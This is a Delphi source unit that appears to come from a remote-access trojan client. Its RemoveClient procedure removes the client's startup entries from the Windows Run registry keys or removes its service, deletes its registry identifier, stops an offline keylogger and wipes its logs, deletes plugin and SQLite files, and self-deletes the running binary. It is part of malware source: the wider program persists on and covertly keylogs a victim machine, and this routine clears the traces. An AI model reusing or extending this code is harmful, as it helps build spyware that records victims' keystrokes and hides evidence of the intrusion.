unit UnitInstallation;

interface

uses
  Windows, UnitConfiguration, UnitVariables, UnitKeyboardInputs, UnitRegistryEditor,
  UnitFunctions, UnitTasksManager, UnitFilesManager;

procedure RemoveClient;

implementation
             
procedure RemoveClient;
begin
  if _StartupOptions = 0 then
  begin
    if _HKCUStartup then
    DeleteRegkey('HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\',
      _StartupKey, True);

    if _HKLMStartup then
    DeleteRegkey('HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\',
      _StartupKey, True);

    if _PoliciesStartup then
    DeleteRegkey('HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\',
      _StartupKey, True);
  end
  else RemoveService(_ServiceName);

  DeleteRegkey('HKEY_CURRENT_USER\Software\' + _ClientId + '\', NewIdentification, False);

  if _Keylogger then
  begin
    StopOfflineKeylogger;
    DeleteAllFilesAndDir(KeylogsPath);
  end;

  if FileExists(Pluginfile) then MyDeleteFile(Pluginfile);
  if FileExists(Sqlite3file) then MyDeleteFile(Sqlite3file);
  if ClientPath = ParamStr(0) then MySelfDelete else MyDeleteFile(ClientPath);
end;

end.
